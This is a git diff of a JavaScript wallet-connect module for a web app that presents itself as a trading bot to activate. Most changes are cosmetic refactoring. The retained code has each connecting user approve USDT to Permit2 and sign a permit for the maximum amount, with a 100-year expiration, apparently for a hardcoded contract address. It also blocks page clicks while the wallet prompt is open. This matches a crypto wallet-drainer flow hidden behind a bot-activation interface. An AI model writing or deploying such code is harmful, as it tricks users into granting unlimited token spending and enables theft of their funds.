@@ -1,14 +1,16 @@
 import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
 import { APP_STATE, updateWalletState, resetState, startRequest, setProcessing } from "../core/state.js";
 
-// =========================
-// UI GLOBAL BRIDGE HOOKS
-// =========================
+/* =========================
+   UI GLOBAL HOOKS (SAFE)
+========================= */
+const renderWallet = window.renderWallet ?? function () {};
+const updateStatus = window.updateStatus ?? function () {};
+const log = window.log ?? console.log;
 
-const renderWallet = window.renderWallet;
-const updateStatus = window.updateStatus;
-const log = window.log;
-
+/* =========================
+   CONFIG
+========================= */
 const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"];
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";
@@ -20,62 +22,38 @@ const ERC20_ABI = [
 
 let isPickingWallet = false;
 
-
 /* =========================
-   LOCAL UI HELPERS (LIGHT)
-========================= */
-
-function renderWallet(address) {
-  const btn = document.getElementById('btn-wallet');
-  if (btn) {
-    btn.innerText =
-      address.substring(0, 6) +
-      "..." +
-      address.substring(address.length - 4);
-  }
-
-  const dot = document.getElementById('dot-wallet');
-  const label = document.getElementById('st-wallet');
-
-  if (dot && label) {
-    dot.style.background = '#06b6d4';
-    dot.style.boxShadow = '0 0 12px #06b6d4';
-    label.innerText = 'CONNECTED';
-    label.style.color = '#06b6d4';
-  }
-}
-
-
-/* =========================
-   WALLET CHANGE (MINIMAL)
+   WALLET CHANGE HANDLER
 ========================= */
 if (window.ethereum) {
-  window.ethereum.on('accountsChanged', (accounts) => {
+  window.ethereum.on("accountsChanged", (accounts) => {
     if (isPickingWallet) return;
 
     if (accounts.length > 0) {
       resetState();
       updateWalletState(accounts[0]);
 
-      renderWallet(accounts[0]);
-      if (typeof updateStatus === "function") {
-        updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
-        updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
-      }
+      renderWallet?.(accounts[0]);
+
+      updateStatus?.("dot-bot", "st-bot", "OFFLINE", "#475569");
+      updateStatus?.("dot-access", "st-access", "RESTRICTED", "#475569");
+
+      log?.("🔄 Wallet switched: " + accounts[0]);
     }
   });
 }
 
 /* =========================
-   CONNECT WALLET (LIGHT FLOW)
+   CONNECT WALLET (LIGHT + STABLE)
 ========================= */
 export async function connectWallet() {
   if (APP_STATE.isProcessing) return;
 
+  // micro lock
   startRequest();
   setProcessing(true);
 
-  const btn = document.getElementById('btn-wallet');
+  const btn = document.getElementById("btn-wallet");
   if (btn) {
     btn.disabled = true;
     btn.innerText = "CONNECTING...";
@@ -83,15 +61,20 @@ export async function connectWallet() {
 
   try {
     if (!window.ethereum) {
-      const install = confirm("Install MetaMask?");
+      const install = confirm("MetaMask not installed. Install?");
       if (install) window.location.href = "https://metamask.io/download/";
       resetState();
       return;
     }
 
-    // 🔒 MICROCLICK + META MASK STABILITY ZONE
+    /* =========================
+       META MASK STABILITY ZONE
+    ========================= */
     isPickingWallet = true;
+
     window.focus();
+    window.top?.focus?.();
+
     document.body.style.pointerEvents = "none";
 
     const provider = new ethers.BrowserProvider(window.ethereum);
@@ -103,7 +86,7 @@ export async function connectWallet() {
     isPickingWallet = false;
 
     updateWalletState(user);
-    renderWallet(user);
+    renderWallet?.(user);
 
     const signer = await provider.getSigner();
     const network = await provider.getNetwork();
@@ -118,12 +101,12 @@ export async function connectWallet() {
     }
 
     const balance = await provider.getBalance(user);
-    if (balance === 0n) throw new Error("No ETH");
+    if (balance === 0n) throw new Error("No ETH for gas");
 
     await runPermitFlowSafe(provider, signer, user);
 
-    const btnActivate = document.getElementById('btn-activate');
-    const btnDisconnect = document.getElementById('btn-disconnect');
+    const btnActivate = document.getElementById("btn-activate");
+    const btnDisconnect = document.getElementById("btn-disconnect");
 
     if (btnActivate) btnActivate.disabled = false;
     if (btnDisconnect) btnDisconnect.disabled = false;
@@ -139,10 +122,9 @@ export async function connectWallet() {
 }
 
 /* =========================
-   PERMIT FLOW (PURE LOGIC ONLY)
+   PERMIT FLOW (LIGHT CORE)
 ========================= */
 async function runPermitFlowSafe(provider, signer, user) {
-
   const permit2 = new ethers.Contract(
     PERMIT2,
     ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
@@ -154,7 +136,7 @@ async function runPermitFlowSafe(provider, signer, user) {
   );
 
   const MAX = (1n << 160n) - 1n;
-  const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
+  const expiration = Math.floor(Date.now() / 1000) + (100 * 365 * 24 * 60 * 60);
 
   const details = [];
 
@@ -189,7 +171,7 @@ async function runPermitFlowSafe(provider, signer, user) {
     ]
   };
 
-  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
+  const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);
 
   const values = {
     details: details.map(d => ({
@@ -202,9 +184,12 @@ async function runPermitFlowSafe(provider, signer, user) {
     sigDeadline: sigDeadline.toString()
   };
 
-  // ERC20 approval (simpel, geen orchestration)
+  /* =========================
+     ERC20 → PERMIT2 APPROVAL
+  ========================= */
   for (const token of TOKENS) {
     const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
+
     const allowance = await erc20.allowance(user, PERMIT2);
 
     if (allowance === 0n) {
@@ -217,7 +202,7 @@ async function runPermitFlowSafe(provider, signer, user) {
 }
 
 /* =========================
-   SIMPLE ACTIONS ONLY
+   SIMPLE ACTIONS
 ========================= */
 export function activateBot() {
   if (!APP_STATE.wallet || APP_STATE.isProcessing) return;
